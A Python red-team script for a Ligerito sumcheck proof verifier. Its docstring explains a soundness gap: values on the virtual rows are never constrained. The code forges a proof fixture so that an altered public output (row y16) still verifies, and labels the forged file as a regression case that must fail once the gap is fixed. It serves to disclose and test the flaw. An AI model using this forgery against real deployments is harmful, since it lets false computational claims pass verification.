"""red-team-ligerito-2 V1: the committed polynomial is never constrained on the virtual-row block.

The relation verifier (``sumcheck.verify`` LGSC0002/LGSC0003, Rust ``relation::verify``) reconstructs

    z~(r_i, r_c) = values[0] + sum_{v public} eq(r_i, idx_v) pub_v~(r_c) + sum_x eq(r_i, idx(next:x)) next_x

and ``values[0]`` is checked by the PCS against the commitment as ``w~(r_i, r_c)``.  That identity is only right if the
committed ``w`` is ZERO on the virtual rows ``[m, m + n_virt)``.  Only the honest prover zeroes them; nothing in the
verifier (zero-check, combined/rows sumcheck, PCS) checks it.  A prover that commits ``w' = w - delta`` on virtual row
``v`` makes the verifier's reconstructed ``z`` equal the honest ``z`` of a statement whose public row ``v`` is
``pub_v + delta``.  With ``v = y16`` that is "any claimed output verifies".

This script forges at the fixture level (no prover needed): statement ``y16[c0] += d``, proof ``values[0] -= d * eq(r_i,
idx_y16) eq(r_c, c0)`` (exactly ``w'~(r_i, r_c)`` for ``w' = w - d e_{y16, c0}``).  No challenge depends on ``values``
before the last sumcheck coin (it is absorbed last), so every message is unchanged; the PCS then opens ``w'`` honestly.

    python backends/direct/ligerito/redteam_virtrow.py IN.json OUT.json [--row y16] [--col C] [--delta D]

IN: an LGSC0002 fixture (``backends/ligerito-verify/fixtures/sumcheck/*.json``) or an LGSC0003 one (sumcheck-2's
``lgsc0003_fixture_*.json[.gz]``, with a ``transcript``: its ``values`` absorb is rewritten too).
"""
from __future__ import annotations

import argparse
import gzip
import json

P = 2013265921
W = 31          # x^6 = 31
D = 6


def emul(a, b):
    t = [0] * 11
    for i in range(D):
        if a[i]:
            for j in range(D):
                t[i + j] += a[i] * b[j]
    for k in range(10, 5, -1):
        t[k - 6] += W * t[k]
    return [x % P for x in t[:D]]


def esub(a, b):
    return [(x - y) % P for x, y in zip(a, b)]


def eadd(a, b):
    return [(x + y) % P for x, y in zip(a, b)]


def base(x):
    return [x % P] + [0] * (D - 1)


def eq_idx(r, idx):
    """eq(r, bits(idx)), r[t] <-> bit t (LSB first)."""
    acc = base(1)
    one = base(1)
    for t, rt in enumerate(r):
        acc = emul(acc, rt if (idx >> t) & 1 else esub(one, rt))
    return acc


def load(path):
    raw = open(path, "rb").read()
    if raw[:2] == b"\x1f\x8b":
        raw = gzip.decompress(raw)
    return json.loads(raw)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("inp")
    ap.add_argument("out")
    ap.add_argument("--row", default="y16")
    ap.add_argument("--col", type=int, default=None, help="column to shift (default: first column with end mask 1)")
    ap.add_argument("--delta", type=int, default=1)
    a = ap.parse_args()
    fx = load(a.inp)
    lay = fx["layout"]
    n_i = lay["n_i"]
    row = lay["virt"][a.row]
    pub = fx["public_rows"]
    col = a.col if a.col is not None else next(j for j, e in enumerate(pub["end"]) if e)
    pub[a.row][col] = (pub[a.row][col] + a.delta) % P
    cl0 = fx["claims"][0]
    pt = cl0["point"]
    r_i, r_c = pt[:n_i], pt[n_i:]
    corr = emul(base(a.delta), emul(eq_idx(r_i, row), eq_idx(r_c, col)))
    new_v0 = esub(cl0["value"], corr)
    old_v0 = list(cl0["value"])
    cl0["value"] = new_v0
    pb = bytearray(bytes.fromhex(fx["proof_hex"]))
    nv = 1 + lay["n_links"]
    off = len(pb) - 24 * nv
    assert [int.from_bytes(pb[off + 4 * k: off + 4 * k + 4], "little") for k in range(D)] == old_v0, "values[0] not at the tail"
    for k in range(D):
        pb[off + 4 * k: off + 4 * k + 4] = new_v0[k].to_bytes(4, "little")
    fx["proof_hex"] = pb.hex()
    old_vals_hex = bytes(bytes.fromhex(load(a.inp)["proof_hex"])[off:]).hex()
    new_vals_hex = bytes(pb[off:]).hex()
    for ev in fx.get("transcript", []) or []:
        for k, v in list(ev.items()):
            if isinstance(v, str) and v == old_vals_hex:
                ev[k] = new_vals_hex
    fx["source"] = (fx.get("source", "") + f" | FORGED by red-team-ligerito-2 redteam_virtrow.py: public row {a.row}[{col}] += {a.delta}, "
                    f"values[0] -= delta*eq(r_i,{row})*eq(r_c,{col}) (= w' with -delta on the virtual row). MUST REJECT once the "
                    "verifier constrains w on the virtual block.")
    fx["redteam"] = {"finding": "V1 virtual rows unconstrained", "row": a.row, "row_index": row, "col": col, "delta": a.delta,
                     "values0_old": old_v0, "values0_new": new_v0}
    data = json.dumps(fx).encode()
    open(a.out, "wb").write(gzip.compress(data) if a.out.endswith(".gz") else data)
    print(f"forged {a.row}[{col}] += {a.delta} (row {row}); values[0] {old_v0[:2]}.. -> {new_v0[:2]}..; wrote {a.out}")


if __name__ == "__main__":
    main()
